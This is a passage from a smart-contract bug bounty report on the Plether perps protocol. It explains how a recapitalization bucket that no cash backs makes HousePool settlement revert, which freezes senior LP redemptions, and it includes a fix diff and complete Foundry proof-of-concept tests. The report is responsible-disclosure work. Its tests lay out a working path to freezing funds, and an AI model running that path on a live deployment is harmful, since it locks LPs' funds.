# \#99385 [SC-High] Cash-less pending recapitalization bucket in HousePool deadlocks settleLpEpoch and temporarily freezes senior LP redemptions

**Submitted on Nov 13th 2026 at 12:54:00 UTC by @Squid11643 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99385
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

`CfdEngine.recapitalizePool` is the documented owner recovery for degraded mode. It moves USDG into `HousePool` and records it in `pendingRecapitalizationAssets`, a bucket that is meant to be allocated at the next LP reconcile. The same cash immediately counts as pool backing, so it can be paid to traders when the positions it was injected to back close in profit.

`HousePool.payOut` never reduces the pending bucket. LP epoch settlement still reserves the full bucket, so once the cash behind it has left, free cash is zero, the senior redemption cannot be funded, and `settleLpEpoch` reverts `HousePool__NoLpEpochProgress`. That revert also rolls back the reconcile that would have consumed the bucket, so every later permissionless settlement fails in the same way. In the PoC, 26,970.30 USDG of senior LP cash is frozen for 7 days (28 of 28 settlement attempts revert) with a flat book and no other claimant.

## Vulnerability Details

The bucket is written in two places only:

- `HousePool.sol#L1794-L1803` `_recordPendingClaimantInflow`: adds the recapitalization amount (called from `recordClaimantInflow`, which `CfdEngine.recapitalizePool` uses at `CfdEngine.sol#L632-L650`).
- `HousePool.sol#L1787-L1792` `_decreasePendingClaimantBuckets`: subtracts only what a reconcile settles.

`HousePool.payOut` (`HousePool.sol#L604-L613`) lowers `accountedAssets` and transfers USDG, but leaves the bucket untouched:

```solidity
function payOut(address recipient, uint256 amount) external {
    if (msg.sender != address(ENGINE) && msg.sender != ENGINE.settlementSidecar()) {
        revert HousePool__Unauthorized();
    }
    accountedAssets -= amount;
    settlementToken.safeTransfer(recipient, amount);
}
```

Every LP free-cash computation reserves the full nominal bucket on top of liabilities and trader claims:

- `HousePool.sol#L842-L843` (inside `_settleLpEpoch`): `freeAssets = _buildWithdrawalSnapshot(accountingSnapshot, unassignedAssets, _pendingClaimantBucketAssets()).freeAssets`
- `HousePool.sol#L1727-L1735` `_buildWithdrawalSnapshot` reserves `reservedPendingClaimantAssets`; `getSettlementFreeAssets` (`#L1242-L1255`) does the same.

The reconcile run at the start of `settleLpEpoch` (`HousePool.sol#L835`) settles only `min(bucket, distributable)` (`_settleablePendingClaimantBuckets`, `HousePool.sol#L1829-L1834`, via `HousePoolPendingPreviewLib.capClaimantBuckets`) and leaves the rest pending. When the bucket is larger than the cash that is left, that residual has no cash behind it but is still reserved:

1. Free cash becomes `P - residual`, which is 0 once `bucket >= 2P` (P = pool cash, with no claims, no open liability and nothing unassigned).
2. The senior head has a nonzero value but a zero budget, so nothing is funded. A senior backlog skips the junior phase (`HousePool.sol#L878-L879`), and deposits cannot activate while the senior is impaired.
3. `_emitLpEpochSettled` reverts `HousePool__NoLpEpochProgress` (`HousePool.sol#L1183-L1185`). The revert also undoes the reconcile from step 0, so the residual is never reduced and the next attempt sees the same state.

There is no permissionless way out. The other `_reconcile` callers are owner-only (`finalizePoolConfig` `#L327`, `assignUnassignedAssets` `#L660-L663`, `initializeSeedPosition` `#L714-L718`), `reconcile()` is `onlyVault` and no vault calls it, and a matured redeem request cannot be cancelled (`TrancheVault.sol#L894-L896`).

This is a new bug introduced by the fix for the Cecuro finding LOW-22 ("Governance cannot use the documented non-dilutive recapitalization path"). The fix added `recapitalizePool` with the note "Allocation is deferred to normal reconciliation". The deferred allocation is exactly what deadlocks: the residual reservation makes settlement no-progress, and the no-progress revert discards the reconcile that would consume it.

The same root cause affects `pendingTradingRevenueAssets` (same bucket set, same reservation), but trading revenue is only queued when both tranche principals are zero (`HousePool.sol#L646-L647`), so the recapitalization bucket is the practical path.

## Impact Details

- **Frozen funds:** 26,970.30 USDG of senior LP cash in the PoC. After the last position closes there are no trader claims, no open liability and nothing unassigned, so all of it belongs to the senior tranche. The senior LP's redemption stays unfunded for every hourly epoch over 7 days (28 of 28 `settleLpEpoch` calls revert), the LP cannot cancel the matured request, and its wallet does not change. Junior redemptions are queued behind the senior backlog as well.
- **Duration:** the freeze has no permissionless end. It clears only through one of the following:
  - The owner adds capital beyond the documented shortfall. The exact minimum is `bucket - 2P` (13,557.56 USDG in the PoC; 14,557.56 is used in `test_H1_unblockNeedsExtraOwnerCapital`), and this extra capital ends up with the senior, so the owner cannot recover it.
  - The owner runs a 72-hour-timelocked pool config change (`finalizePoolConfig`) whose persisted reconcile shrinks the bucket. Even this route keeps the funds frozen for at least 72 hours.
  - New traders open positions and realize losses large enough to raise pool revenue above `bucket/2 - P` (about 6,779 USDG in the PoC).
- **Trusted-role conduct:** the owner only follows the documented runbook (SECURITY.md "Owner-funded recapitalization" and "Explicit terminal-deficit cascade" steps 4 and 5: recapitalize, then clear degraded mode once `E >= L`). Per the program rules, a legitimate documented trusted action that triggers a bug harming users is in scope.
- **No permanent loss:** once unblocked, the senior is paid.

**Feasibility (stated plainly, per the program's feasibility section):** the freeze needs the pool to be in degraded mode, the owner to recapitalize, and the recapitalized side to then realize a large win, so that the bucket ends up at least twice the remaining pool cash. With the `E >= L + B` admission gate this takes large cumulative basket moves. Measured at runtime (`H_Repro1b.t.sol`, every liquidatable account liquidated after each 1% step): the smallest freezing path found was about a 150% cumulative move (+90%, then down to 0.60). Paths with smaller cumulative moves only delay funding by one epoch, and a 200-cycle 2% ping-pong (800% cumulative path) never froze. The program asks for impact to be assessed first and feasibility to scale the payout, which is why the impact is reported as High.

## References

- `packages/perps/src/HousePool.sol` L604-L613, L835-L843, L878-L879, L1183-L1185, L1242-L1255, L1727-L1735, L1787-L1803, L1829-L1834
- `packages/perps/src/CfdEngine.sol` L632-L650 (`recapitalizePool`), L658 (`clearDegradedMode`)
- `packages/perps/src/TrancheVault.sol` L894-L896
- `packages/perps/SECURITY.md` L155-L162 (Owner-funded recapitalization), L1499-L1510 (Explicit terminal-deficit cascade)
- Cecuro report LOW-22 and its fix note

## Recommendation

Do not reserve pending claimant value that has no cash behind it. After `_applyPendingClaimantBucketsLive` settles `min(bucket, distributable)`, the residual exceeds what the pool can back. Either clip it, the same way `HousePoolReconcilePlanLib.planReconcile` clips `unassignedAssets` to `distributable` (`HousePoolReconcilePlanLib.sol#L73-L74`), or stop counting it in the withdrawal reserve. A sketch of the first option (not run against the full test suite):

```diff
 function _applyPendingClaimantBucketsLive(
     HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets,
     HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets,
     bool allowRevenueContinuation
 ) internal {
-    if (_pendingClaimantBucketAssets(settleableClaimantBuckets) == 0) {
-        return;
-    }
+    if (_pendingClaimantBucketAssets(settleableClaimantBuckets) != 0) {
         HousePoolPendingPreviewLib.PendingAccountingState memory state = _currentPendingAccountingState();
         HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
             state, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
         );
         _decreasePendingClaimantBuckets(settleableClaimantBuckets);
         _setWaterfallState(state.waterfall);
         unassignedAssets = state.unassignedAssets;
+    }
+    // The residual exceeded distributable equity: its cash already left the pool. Drop it instead of
+    // reserving it, or it blocks every later LP settlement.
+    pendingRecapitalizationAssets = 0;
+    pendingTradingRevenueAssets = 0;
 }
```

Clearing the whole residual is the simplest form. If the team wants to keep recapitalization intent when distributable equity is only temporarily depressed (for example by unrealized trader PnL in the terminal delta), the alternative is to leave the stored bucket as is and instead cap the amount passed as `reservedPendingClaimantAssets` to `_buildWithdrawalSnapshot` (`HousePool.sol#L842-L843` and `#L1254`) at the cash-backed part of the bucket.

A complementary change is to treat a settlement whose only effect is a reconcile that changes the pending buckets as progress, so `_emitLpEpochSettled` does not revert and roll it back.



## Link to Proof of Concept

https://gist.github.com/Akashneelesh/d2220e8de6688e47bd1476706644a114

## Proof of Concept

## Proof of Concept

The PoC runs in the repository's Foundry suite at the audit commit with no contract changes. It uses the audit harness `PocBase.sol` (deployment risk parameters from `DEPLOYMENT.md`) and `LpEpochPocBase.sol` (LP epochs through the public `router.settleLpEpoch`). All three files are included in full below and go in `packages/perps/test/perps/audit/`. Only Pyth (`MockPyth`) and USDG are mocked, both out of scope. Traders, the senior LP and the keeper are plain EOAs acting through public router and vault entrypoints. The keeper is an untrusted address (the pranks are marked `// SETUP:` in the file). The owner only calls `recapitalizePool` and `clearDegradedMode`. `minOpenNotionalAssets` is set to the release value of 1000 USDG through the router's 72-hour timelock.

Steps in `test_H1_seniorRedemptionFrozenByPhantomRecapBucket`:

1. The pool has 60,000 USDG junior plus 1,000 + 1,000 seeds, and a senior LP deposits 40,000 USDG through `requestDeposit` and an epoch settlement.
2. Two traders open 900 lots LONG and 900 lots SHORT at 1.00 (three chunks each, within max skew). The LONG is over-collateralized (96,000 USDG of margin on 90,000 notional), so it is never liquidatable in this path.
3. The basket moves to 1.90 and the SHORT closes in profit. The payout pushes `E < L` and the engine latches degraded mode.
4. The owner recapitalizes exactly `C + L - P` (67,498.16 USDG) and clears degraded mode, as the runbook says.
5. The basket moves to 0.30 and the LONG closes in profit. The book is now flat: no claims, no liability, pool cash 26,970.30 USDG, `pendingRecapitalizationAssets` still 67,498.16 USDG, `getFreeAssets() == 0`.
6. The senior requests redemption of all its shares. A keeper calls `router.settleLpEpoch` every 6 hours for 7 days: all 28 calls revert `HousePool__NoLpEpochProgress`, the senior's claimable amount stays 0, and `cancelRedeemRequest` reverts.

Control `test_H1_control_seniorFundedWhenRecapCashNotConsumed`: the same flow, but in step 5 the LONG closes at its entry price, so the recapitalization cash is not paid out. The first settlement funds the senior, which receives 40,000.73 USDG.

`test_H1_unblockNeedsExtraOwnerCapital` pins the cause: in the frozen state, settlement only succeeds after the owner adds `bucket - 2P + 1000` USDG of extra capital.

Run from the repository root:

```bash
forge test --root packages/perps --match-path "test/perps/audit/H_Repro1.t.sol" -vv
```

Output:

```
[PASS] test_H1_control_seniorFundedWhenRecapCashNotConsumed() (gas: 15710627)
[PASS] test_H1_seniorRedemptionFrozenByPhantomRecapBucket() (gas: 19761498)
  owner recapitalization (exact C + L - P) 67498160919
    pool cash P          26970300000
    trader claims C      0
    pendingRecap bucket  67498160919
    getFreeAssets        0
  settleLpEpoch attempts over 7 days 28 NoLpEpochProgress reverts 28
  senior LP USDG frozen (pool cash with no other claimant) 26970300000
[PASS] test_H1_unblockNeedsExtraOwnerCapital() (gas: 16222400)
  extra owner capital needed beyond the shortfall 14557560919
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

Supporting measurements (feasibility grid, small-step multi-cycle run, organic clearing, exact capital boundary) are in `H_Repro1b.t.sol`. Run with `FOUNDRY_GAS_LIMIT=9000000000000000000 forge test --root packages/perps --match-path "test/perps/audit/H_Repro1b.t.sol" -vv` (9 of 9 pass).


### Files (place in `packages/perps/test/perps/audit/`)

#### `H_Repro1.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// =====================================================================================================================
// H1 PoC: phantom pending recapitalization bucket freezes senior LP redemptions.
//
// After the documented owner recovery (recapitalizePool(C + L - P) + clearDegradedMode) the recapitalization sits in
// HousePool.pendingRecapitalizationAssets. If open positions that the recapitalization backed then close in profit,
// pool cash is paid out but the pending bucket is NOT reduced. LP redemption funding reserves the full nominal bucket
// (HousePool._buildWithdrawalSnapshot / getSettlementFreeAssets), so once bucket >= ~2x pool cash the senior head
// cannot be funded (budget 0), the junior phase is skipped behind the senior backlog, no deposit can activate, and
// _emitLpEpochSettled reverts HousePool__NoLpEpochProgress. That revert rolls back the very reconcile that would
// have consumed the residual bucket, so every permissionless settleLpEpoch fails: the senior LP's cash is frozen.
//
// All steps are public router/vault entrypoints called by EOAs; the owner acts only via recapitalizePool and
// clearDegradedMode (SECURITY.md "Owner-funded recapitalization", "Explicit terminal-deficit cascade" steps 4-5).
//
// Run: forge test --root packages/perps --match-path "test/perps/audit/H_Repro1.t.sol" --out out-ch --cache-path cache-ch -vv
// =====================================================================================================================

import {LpEpochPocBase} from "./LpEpochPocBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

contract H_Repro1Test is LpEpochPocBase {

    address internal traderLong = makeAddr("traderLong");
    address internal traderShort = makeAddr("traderShort");
    address internal seniorLp = makeAddr("seniorLp");
    uint256 internal seniorReq;
    uint256 internal seniorShares;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 60_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.minOpenNotionalAssets = 1000e6; // DEPLOYMENT.md
        routerAdmin.proposeRouterConfig(cfg);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        vm.warp(SETUP_TIMESTAMP + 7 days); // Monday 10:00 UTC
        vm.roll(vm.getBlockNumber() + 1);
        // senior LP enters through the public async path (40k, within the 80% senior-share covenant)
        router.updateMarkPrice(_mockPythUpdateData(1e8));
        uint256 req = _lpRequestDeposit(seniorVault, seniorLp, 40_000e6);
        _warpToEpoch(req);
        _keeperSettleEpoch(1e8);
        seniorShares = _lpClaimDeposit(seniorVault, seniorLp, req);
        assertGt(seniorShares, 0, "senior shares");
    }

    function _mark(
        uint256 p
    ) internal {
        bytes[] memory u = _mockPythUpdateData(p);
        // SETUP: keeper is an untrusted makeAddr EOA; keepers are permissionless in Plether (contest scope).
        vm.prank(keeper);
        router.updateMarkPrice(u);
    }

    /// @dev Builds a two-sided book of 900 lots per side at 1.00 (L = 90k on ~102k of LP cash), chunked by maxSkew.
    function _book() internal {
        for (uint256 i; i < 3; ++i) {
            _traderOpen(traderLong, CfdTypes.Side.LONG, 300e20, 32_000e6, 1e8); // ~1.07x collateralised
            _traderOpen(traderShort, CfdTypes.Side.SHORT, 300e20, 3000e6, 1e8);
        }
    }

    /// @dev Shared prefix: book, basket +90%, SHORT closes (pool pays ~81k) -> degraded; owner recapitalizes exactly
    ///      C + L - P and clears degraded mode (documented recovery).
    function _prefix() internal returns (uint256 recap) {
        _book();
        _mark(1.9e8);
        _assertExecuted(_closeViaRouter(traderShort, CfdTypes.Side.SHORT, 900e20, 1.9e8), "short close");
        assertTrue(engine.degradedMode(), "degraded after the short's realized win");
        (uint256 lMax,,,) = engine.sides(0);
        recap = engine.totalTraderClaimBalanceAssets() + lMax - pool.totalAssets();
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap); // owner == address(this)
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "cleared");
        console2.log("owner recapitalization (exact C + L - P)", recap);
    }

    function _redeemSeniorAndTrySettle(
        uint256 days_
    ) internal returns (uint256 failures, uint256 attempts) {
        vm.warp(vm.getBlockTimestamp() + seniorVault.DEPOSIT_COOLDOWN() + 1);
        seniorReq = _lpRequestRedeem(seniorVault, seniorLp, seniorShares);
        for (uint256 h; h < days_ * 24; h += 6) {
            _warpToEpoch(pool.currentLpEpoch() + 1);
            ++attempts;
            bytes[] memory u = _mockPythUpdateData(1e8);
            // SETUP: keeper is an untrusted makeAddr EOA; keepers are permissionless in Plether (contest scope).
            vm.prank(keeper);
            try router.settleLpEpoch(u) {
                break;
            } catch (bytes memory err) {
                if (bytes4(err) == IHousePool.HousePool__NoLpEpochProgress.selector) {
                    ++failures;
                } else {
                    assembly ("memory-safe") {
                        revert(add(err, 32), mload(err))
                    }
                }
            }
        }
    }

    function _log(
        string memory tag
    ) internal view {
        console2.log(tag);
        console2.log("  pool cash P         ", pool.totalAssets());
        console2.log("  trader claims C     ", engine.totalTraderClaimBalanceAssets());
        console2.log("  pendingRecap bucket ", pool.pendingRecapitalizationAssets());
        console2.log("  getFreeAssets       ", pool.getFreeAssets());
        console2.log("  unassigned          ", pool.unassignedAssets());
    }

    /// ATTACK PATH: the recapitalized liability is then realized as a trader win (basket falls to 0.30).
    function test_H1_seniorRedemptionFrozenByPhantomRecapBucket() public {
        uint256 recap = _prefix();
        _mark(0.3e8);
        _assertExecuted(_closeViaRouter(traderLong, CfdTypes.Side.LONG, 900e20, 0.3e8), "long close");
        (uint256 lMax,,,) = engine.sides(0);
        (uint256 sMax,,,) = engine.sides(1);
        assertEq(lMax + sMax, 0, "book flat: no liability reserve");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claims");
        _log("after all positions closed");
        uint256 P = pool.totalAssets();
        assertGt(P, 20_000e6, "LP-owned cash remains in the pool");
        assertGe(pool.pendingRecapitalizationAssets(), recap, "pending bucket still nominal after the cash was paid out");
        assertGt(pool.pendingRecapitalizationAssets(), P, "bucket exceeds the cash it claims to represent");

        uint256 walletBefore = settlementToken.balanceOf(seniorLp);
        (uint256 failures, uint256 attempts) = _redeemSeniorAndTrySettle(7);
        console2.log("settleLpEpoch attempts over 7 days", attempts, "NoLpEpochProgress reverts", failures);
        assertEq(failures, attempts, "every permissionless settlement reverts for 7 days");
        assertEq(seniorVault.claimableRedeemRequest(seniorReq, seniorLp), 0, "senior redemption never funded");
        assertEq(pool.getFreeAssets(), 0, "all pool cash reserved by the phantom bucket");
        assertEq(settlementToken.balanceOf(seniorLp), walletBefore, "senior LP received nothing");
        // the senior cannot even cancel: the request has matured
        vm.prank(seniorLp);
        vm.expectRevert();
        seniorVault.cancelRedeemRequest(seniorReq, seniorLp);
        console2.log("senior LP USDG frozen (pool cash with no other claimant)", P);
    }

    /// ROOT-CAUSE PIN: in the frozen state, settlement reconciles min(bucket, D) and reserves the residual, so free cash
    ///      is ~2P - bucket. Injecting (bucket - 2P) of EXTRA owner money beyond the documented shortfall is what it
    ///      takes to unblock: the barrier is the cash-less pending bucket, not any trader or LP liability.
    function test_H1_unblockNeedsExtraOwnerCapital() public {
        _prefix();
        _mark(0.3e8);
        _assertExecuted(_closeViaRouter(traderLong, CfdTypes.Side.LONG, 900e20, 0.3e8), "long close");
        (uint256 failures, uint256 attempts) = _redeemSeniorAndTrySettle(1);
        assertEq(failures, attempts, "frozen");
        uint256 P = pool.totalAssets();
        uint256 bucket = pool.pendingRecapitalizationAssets();
        uint256 extra = bucket - 2 * P + 1000e6;
        console2.log("extra owner capital needed beyond the shortfall", extra);
        settlementToken.mint(address(this), extra);
        settlementToken.approve(address(engine), extra);
        engine.recapitalizePool(extra);
        _warpToEpoch(pool.currentLpEpoch() + 1);
        _keeperSettleEpoch(1e8);
        assertGt(seniorVault.claimableRedeemRequest(seniorReq, seniorLp), 0, "unblocked only after extra capital");
    }

    /// CONTROL: identical up to the recapitalization, but the recapitalized liability does not pay out (the LONG
    ///          closes at its entry price). The pending bucket is then covered by cash and the senior is funded at
    ///          the first settlement.
    function test_H1_control_seniorFundedWhenRecapCashNotConsumed() public {
        _prefix();
        _mark(1e8);
        _assertExecuted(_closeViaRouter(traderLong, CfdTypes.Side.LONG, 900e20, 1e8), "long close flat");
        _log("control: after all positions closed");
        (uint256 failures, uint256 attempts) = _redeemSeniorAndTrySettle(7);
        assertEq(failures, 0, "control: first settlement succeeds");
        assertEq(attempts, 1, "control: one attempt");
        uint256 claimable = seniorVault.claimableRedeemRequest(seniorReq, seniorLp);
        assertGt(claimable, 0, "control: senior redemption funded");
        uint256 got = _lpClaimRedeem(seniorVault, seniorLp, seniorReq);
        console2.log("control: senior LP received", got);
        assertGt(got, 0, "control: senior paid");
    }

}
```

#### `LpEpochPocBase.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PocBase} from "./PocBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/console2.sol";

/// @notice LP-epoch PoC scaffold. Every step goes through a public production entrypoint:
///         vault.requestDeposit / claimDeposit / requestRedeem / claimRedeem and the permissionless
///         router.settleLpEpoch(pythUpdate) keeper call. No pranking as router/engine/pool.
abstract contract LpEpochPocBase is PocBase {

    /// @dev LP requests a deposit. Returns the request (epoch) id.
    function _lpRequestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    /// @dev Warp to the start of `epochId` (no-op if already past it).
    function _warpToEpoch(
        uint256 epochId
    ) internal {
        uint256 start = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < start) {
            vm.warp(start);
        }
    }

    /// @dev Untrusted keeper settles matured LP epochs at `markPrice` (8 decimals) via the public router entrypoint.
    function _keeperSettleEpoch(
        uint256 markPrice
    ) internal {
        bytes[] memory update = _mockPythUpdateData(markPrice);
        vm.prank(keeper);
        router.settleLpEpoch(update);
    }

    function _lpClaimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal returns (uint256 shares) {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _lpRequestRedeem(
        TrancheVault vault,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
    }

    function _lpClaimRedeem(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal returns (uint256 assets) {
        uint256 claimable = vault.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = vault.claimRedeem(requestId, claimable, lp, lp);
    }

    /// @dev Opens a trader position through the router at `price` (trader is funded first).
    function _traderOpen(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        _fundTraderCash(trader, margin * 2);
        _assertExecuted(_openViaRouter(trader, side, size, margin, price), "trader open");
    }

    /// @dev Full LP round trip: deposit at depositPrice, redeem at redeemPrice. Returns USDG paid in and received.
    ///      Prices are the marks the keeper uses for each epoch settlement.
    function _lpRoundTrip(
        TrancheVault vault,
        address lp,
        uint256 amount,
        uint256 depositSettlePrice,
        uint256 redeemSettlePrice
    ) internal returns (uint256 paidIn, uint256 receivedOut) {
        paidIn = amount;
        uint256 depId = _lpRequestDeposit(vault, lp, amount);
        _warpToEpoch(depId);
        _keeperSettleEpoch(depositSettlePrice);
        uint256 shares = _lpClaimDeposit(vault, lp, depId);
        console2.log("lp shares minted", shares);

        vm.warp(vm.getBlockTimestamp() + vault.DEPOSIT_COOLDOWN() + 1);
        uint256 redId = _lpRequestRedeem(vault, lp, shares);
        _warpToEpoch(redId);
        _keeperSettleEpoch(redeemSettlePrice);
        receivedOut = _lpClaimRedeem(vault, lp, redId);
        console2.log("lp USDG in ", paidIn);
        console2.log("lp USDG out", receivedOut);
    }

}
```

#### `PocBase.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// =====================================================================================================================
// Immunefi Plether audit-comp PoC base (local only, not part of the upstream suite).
//
// Why this exists instead of using BasePerpTest directly:
//   * BasePerpTest's `_open/_close` helpers `vm.prank(address(router))` straight into the engine. That bypasses every
//     router/policy check, so a PoC built on them is not a valid user-reachable exploit. The helpers here go through
//     the production `OrderRouter.commitOrder(OrderV3Types.OrderRequest)` + `executeOrder` surface instead.
//   * BasePerpTest's risk params (1% MM / 1.5% IM, no VPI) differ from the Arbitrum deployment params Immunefi uses
//     for severity. This base installs the deployment values from script/DeployPerpsArbitrumSepolia.s.sol.
//
// Rules reminder (Immunefi scope page): do NOT modify in-scope contracts; mock only out-of-scope pieces (Pyth, USDG).
// Owner/Pauser/Guardian/treasury are trusted. Keepers are NOT trusted (any address may act as keeper).
//
// Run:  forge test --root packages/perps --match-path "test/perps/audit/*" -vvv
// =====================================================================================================================

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

abstract contract PocBase is BasePerpTest {

    // --- Deployment parameters (script/DeployPerpsArbitrumSepolia.s.sol, v2.0.0) ---
    uint256 internal constant DEPLOY_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant DEPLOY_MAX_SENIOR_SHARE_BPS = 8000;
    uint256 internal constant DEPLOY_ADVERSE_CONFIDENCE_MULTIPLIER_BPS = 2500;

    /// @dev Position sizes must be multiples of CfdTypes.SIZE_QUANTUM (1e20). Price is 8 decimals, USDG 6 decimals.
    uint256 internal constant ONE_DOLLAR = 1e8;

    address internal keeper = makeAddr("keeper");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    address internal lpAlice = makeAddr("lpAlice");

    // ---------------------------------------------------------------------------------------------------------------
    // Setup
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Deployment risk params (constructor-installed, so no timelock needed).
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev 1M junior + 1M senior LP capital on top of the 1k/1k seed positions.
    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 1_000_000e6;
    }

    function setUp() public virtual override {
        super.setUp();
        _applyDeploymentTimelockedConfig();
        vm.label(address(engine), "CfdEngine");
        vm.label(address(pool), "HousePool");
        vm.label(address(clearinghouse), "MarginClearinghouse");
        vm.label(address(router), "OrderRouter");
        vm.label(address(seniorVault), "SeniorVault");
        vm.label(address(juniorVault), "JuniorVault");
        vm.label(address(pletherOracle), "PletherOracle");
        vm.label(address(settlementToken), "USDG(mock)");
    }

    /// @dev Senior caps and the oracle confidence multiplier are timelocked (72h). Propose both, warp once, finalize.
    ///      Setup starts Monday 10:00 UTC, so +72h lands on Thursday (outside the FAD/weekend window).
    function _applyDeploymentTimelockedConfig() internal {
        IHousePool.PoolConfig memory poolCfg = _currentPoolConfig();
        poolCfg.maxSeniorExposureAssets = DEPLOY_MAX_SENIOR_EXPOSURE_ASSETS;
        poolCfg.maxSeniorShareBps = DEPLOY_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(poolCfg);

        IOrderRouterAdminHost.RouterConfig memory routerCfg = _routerConfig();
        routerCfg.adverseConfidenceMultiplierBps = DEPLOY_ADVERSE_CONFIDENCE_MULTIPLIER_BPS;
        routerAdmin.proposeRouterConfig(routerCfg);

        uint256 activation = pool.poolConfigActivationTime();
        vm.warp(activation > block.timestamp + 72 hours + 1 ? activation : block.timestamp + 72 hours + 1);
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Order helpers: production V3 surface only
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Permissive bounds; tighten individual fields in a PoC when the bound itself is under test.
    function _permissiveBounds() internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        b.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        b.allowedExecutionModes = 7;
        b.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.minPostSettlementBalanceAssets = 0;
        b.minPostPositionEquityAssets = 0;
        b.maxPostLeverageBps = type(uint32).max;
    }

    /// @dev Unbounded slippage target, as used by the legacy harness: LONG profits when the basket falls.
    function _anyPriceTarget(
        CfdTypes.Side side,
        bool isClose
    ) internal pure returns (uint256) {
        return (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory req) {
        req.clientOrderId = keccak256(abi.encode("poc", router.nextCommitId(), side, size, margin, isClose));
        req.side = side;
        req.sizeDelta = size;
        req.marginDelta = isClose ? 0 : margin;
        req.targetPrice = _anyPriceTarget(side, isClose);
        req.isClose = isClose;
        req.bounds = _permissiveBounds();
    }

    function _commit(
        address trader,
        OrderV3Types.OrderRequest memory req
    ) internal returns (uint64 id) {
        vm.prank(trader);
        id = router.commitOrder(req);
    }

    /// @dev Publishes a fresh mock Pyth price (advances block+1s) and executes `id` as `executor`.
    function _execute(
        uint64 id,
        uint256 price,
        address executor
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(executor);
        result = router.executeOrder(id, update);
    }

    function _openViaRouter(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 id = _commit(trader, _request(side, size, margin, false));
